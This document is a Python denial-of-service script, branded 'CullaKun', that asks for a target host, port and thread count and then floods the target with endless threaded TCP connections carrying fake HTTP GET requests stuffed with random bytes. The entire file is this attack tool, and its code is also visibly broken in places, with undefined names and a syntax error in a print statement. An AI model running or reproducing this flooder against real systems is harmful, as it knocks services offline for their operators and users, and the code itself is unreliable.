import socket
import sys
import time
import os
import random
from threading import Thread
from colorama import init, Fore, Back, Style

os.system("clear")

if not __name__ == "__main__":
    exit()
      
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    RESET = '\033[0m' # Resets color to default

# Example usage:
print(RED + "This text is red." + RESET)

print(Colors.BOLD + Colors.BLACK + '''
Banner 

         
      ''')
    
def getport():
    try:
        p = int(input(Colors.BOLD + Colors.BOLD + "╰─> Port:\r\n"))
        return p
    except ValueError:
        print(Colors.BOLD + Colors.WARNING + "ERROR Port must be a number, Set Port to default " + Colors.OKGREEN + "80")
        return 80
print(Colors.BOLD + "╭──[CullaKun]──⬣")
host = input(Colors.BOLD + Colors.BOLD + "╰─> Host:\r\n")
port = getport()
speedPerRun = int(input(Colors.BOLD + Colors.BOLD + "╰─> Hits Running:\r\n"))
threads = int(input(Colors.BOLD + Colors.BOLD + "╰─> Thread Count:\r\n"))

ip = socket.gethostbyname(host)

bytesToSend = random._urandom(2450)

i = 2;



class Count:
    packetCounter = 0 

def goForDosThatThing():
    try:
        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((ip, port))
                for i in range(speedPerRun): 
                    try:
                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                        print(Colors.BOLD + Colors.OKBLUE + "Sent packet . ." + Colors.OKGREEN + str(Count.packetCounter) + Colors.WARNING)
                        print(Colors.BOLD + Colors.OKBLUE + "Get" + Colors.OKBLUE + str.encode(ip.port)) + Colors.FAIL)
                        Count.packetCounter = Count.packetCounter + 1
                        print(Colors.BOLD + Colors.BOLD + "successful:> " + Colors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + Colors.OKGREEN + "")
                    except socket.error:
                        print(Colors.WARNING + "ERROR, please check the host!")
                    except KeyboardInterrupt:
                        print(Colors.BOLD + Colors.FAIL + "\r\n[-] Canceled by user")
            except socket.error:
                print(Colors.WARNING + "Server error, Please check the host!")
            except KeyboardInterrupt:
                print(Colors.BOLD + Colors.FAIL + "\r\n[-] Canceled by user")
            dosSocket.close()
    except KeyboardInterrupt:
        print(Colors.BOLD + Colors.FAIL + "\r\n[-] Canceled by user")
try:
        
    print(Colors.BOLD + Colors.OKBLUE + '''
    Banner                                                                  
          ''')
    print(Colors.BOLD + Colors.WARNING + "Loading > [     1] 0% ")
    time.sleep(1)
    print(Colors.BOLD + Colors.WARNING + "Loading > [     2] 25%")
    time.sleep(1)
    print(Colors.BOLD + Colors.WARNING + "Loading > [     3] 50%")
    time.sleep(1)
    print(Colors.BOLD + Colors.WARNING + "Loading > [     4] 75%")
    time.sleep(1)
    print(Colors.BOLD + Colors.FAIL + "Loading > [     5] 100%")
    
    for i in range(threads):
        try:
            t = Thread(target=goForDosThatThing)
            t.start()
        except KeyboardInterrupt:
            print(Colors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
except KeyboardInterrupt:
    print(Colors.BOLD + Colors.FAIL + "\r\n[-] Canceled by user")
